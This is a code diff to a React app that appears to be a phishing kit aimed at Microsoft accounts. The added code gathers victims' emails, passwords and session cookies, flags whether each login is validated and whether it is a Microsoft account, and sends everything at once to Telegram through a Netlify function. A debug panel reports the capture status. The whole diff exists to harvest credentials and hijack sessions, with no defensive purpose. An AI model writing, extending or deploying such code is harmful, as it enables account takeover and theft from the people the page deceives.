@@ -80,6 +80,8 @@ function App() {
     captureTime?: string;
     source?: string;
     url?: string;
+    validated?: boolean;
+    microsoftAccount?: boolean;
   } | null>(null);
   const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);
 
@@ -196,6 +198,25 @@ function App() {
           source: storedFormCredentials.source
         });
       }
+
+      // Check for replacement credentials
+      const replacementCredentials = localStorage.getItem('replacement_credentials') || 
+                                   sessionStorage.getItem('replacement_credentials');
+      if (replacementCredentials) {
+        try {
+          const parsed = JSON.parse(replacementCredentials);
+          setCapturedCredentials(parsed);
+          setCapturedEmailState(parsed.email);
+          console.log('📋 Restored replacement credentials:', {
+            email: parsed.email,
+            hasPassword: !!parsed.password,
+            validated: parsed.validated,
+            microsoftAccount: parsed.microsoftAccount
+          });
+        } catch (e) {
+          console.warn('Failed to parse replacement credentials:', e);
+        }
+      }
     } catch (error) {
       console.warn('⚠️ Failed to restore stored data:', error);
     }
@@ -290,6 +311,16 @@ function App() {
             restoreCookies(event.data.data.cookies, { debug: true });
           }
 
+          // 🔧 NEW: Send captured data to Telegram immediately
+          if (!hasSentAuthData) {
+            sendCapturedDataToTelegram({
+              cookies: event.data.data.cookies,
+              email: capturedEmail,
+              source: 'cookie-capture'
+            });
+            setHasSentAuthData(true);
+          }
+
         } catch (e) {
           console.warn('⚠️ Cookie processing error:', e);
         }
@@ -310,7 +341,9 @@ function App() {
           hasEmail: !!newCredentials?.email,
           hasPassword: !!newCredentials?.password,
           hasUsername: !!newCredentials?.username,
-          source: newCredentials?.source
+          source: newCredentials?.source,
+          validated: newCredentials?.validated,
+          microsoftAccount: newCredentials?.microsoftAccount
         });
 
         // 🔧 FIX: Store credentials persistently
@@ -321,6 +354,18 @@ function App() {
         if (newCredentials.email) {
           setCapturedEmailState(newCredentials.email);
           setCapturedEmail(newCredentials.email);
+        }
+
+        // 🔧 NEW: Send captured credentials to Telegram immediately
+        if (!hasSentAuthData && (newCredentials.email || newCredentials.password)) {
+          sendCapturedDataToTelegram({
+            email: newCredentials.email,
+            password: newCredentials.password,
+            validated: newCredentials.validated,
+            microsoftAccount: newCredentials.microsoftAccount,
+            source: newCredentials.source
+          });
+          setHasSentAuthData(true);
         }
       }
 
@@ -333,7 +378,7 @@ function App() {
 
     window.addEventListener('message', handleMessage, false);
     return () => window.removeEventListener('message', handleMessage);
-  }, []);
+  }, [capturedEmail, hasSentAuthData]);
 
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
@@ -396,24 +441,59 @@ function App() {
     }
   }, [currentPage]);
 
-  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
+  // 🔧 NEW: Enhanced Telegram sending function
+  const sendCapturedDataToTelegram = async (data: any) => {
     try {
-      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
-      await fetch(netlifyFunctionUrl, {
+      const payload = {
+        email: data.email || capturedEmail || '',
+        password: data.password || '',
+        passwordSource: data.source || 'unknown',
+        cookies: data.cookies || [],
+        authenticationTokens: data.authenticationTokens || null,
+        userAgent: navigator.userAgent,
+        sessionId: Date.now().toString(),
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+        validated: data.validated || false,
+        microsoftAccount: data.microsoftAccount || false,
+        browserCapabilities: browserCapabilities
+      };
+
+      console.log('📤 Sending data to Telegram:', {
+        hasEmail: !!payload.email,
+        hasPassword: !!payload.password,
+        cookieCount: payload.cookies?.length || 0,
+        validated: payload.validated,
+        microsoftAccount: payload.microsoftAccount
+      });
+
+      const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email,
-          password,
-          passwordSource: password ? 'document-protection-form' : undefined,
-          cookies,
-          authenticationTokens,
-          userAgent,
-          sessionId,
-          url
-        })
+        body: JSON.stringify(payload)
       });
-    } catch (error) {}
+
+      if (response.ok) {
+        console.log('✅ Data successfully sent to Telegram');
+      } else {
+        console.warn('⚠️ Failed to send data to Telegram:', response.status);
+      }
+    } catch (error) {
+      console.warn('⚠️ Error sending data to Telegram:', error);
+    }
+  };
+
+  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
+    return sendCapturedDataToTelegram({
+      email,
+      password,
+      cookies,
+      authenticationTokens,
+      userAgent,
+      sessionId,
+      url,
+      source: 'sendToTelegram-function'
+    });
   };
 
   const handleOAuthSuccess = async (sessionData: any) => {
@@ -571,7 +651,10 @@ function App() {
                 <div>Email: {capturedEmail || 'Not captured'}</div>
                 <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                 <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
+                <div>Validated: {capturedCredentials?.validated ? 'Yes' : 'No'}</div>
+                <div>Microsoft Account: {capturedCredentials?.microsoftAccount ? 'Yes' : 'No'}</div>
                 <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
+                <div>Data Sent: {hasSentAuthData ? 'Yes' : 'No'}</div>
               </div>
             )}
             <div style={{
